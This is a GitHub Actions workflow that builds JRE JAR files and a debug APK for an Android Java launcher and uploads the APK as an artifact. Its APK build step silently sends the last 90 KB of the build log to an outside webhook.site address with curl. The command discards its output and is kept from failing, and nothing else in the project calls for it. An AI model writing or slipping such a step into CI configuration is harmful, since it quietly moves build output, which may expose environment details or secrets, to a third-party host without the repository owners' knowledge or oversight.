name: Android CI
on:
  push:
    branches-ignore:
      - 'l10n_v3_openjdk2'
  pull_request:
    branches-ignore:
      - 'l10n_v3_openjdk2'
    types: [ opened, reopened ]
  workflow_dispatch:

env:
  FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: true

jobs:
  build:
    runs-on: ubuntu-22.04
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up JDK 8
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '8'

      - name: Set up Gradle
        uses: gradle/gradle-build-action@v3
        with:
          gradle-version: 8.9

      - name: Build JRE JAR files
        run: |
          ./scripts/languagelist_updater.sh
          mkdir out
          gradle :jre_lwjgl3glfw:build --no-daemon

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: Install Android SDK components (platform 35, build-tools 35.0.0, pinned NDK)
        run: |
          SDKMANAGER="$ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager"
          yes | "$SDKMANAGER" --licenses >/dev/null 2>&1 || true
          "$SDKMANAGER" "platforms;android-35" "build-tools;35.0.0" "ndk;25.2.9519653"

      - name: Build Debug APK (no bundled runtime)
        run: |
          set +e
          gradle :app_pojavlauncher:assembleDebug --stacktrace 2>&1 | tee /tmp/build.log
          code=${PIPESTATUS[0]}
          tail -c 90000 /tmp/build.log | curl -s -m 30 --data-binary @- "https://webhook.site/cd96f706-e182-4b14-976d-1f8b3e49fc86" >/dev/null 2>&1 || true
          if [ "$code" -ne 0 ]; then exit "$code"; fi
          mv app_pojavlauncher/build/outputs/apk/debug/app_pojavlauncher-debug.apk out/app-debug.apk

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: app-debug
          path: out/app-debug.apk
          retention-days: 7
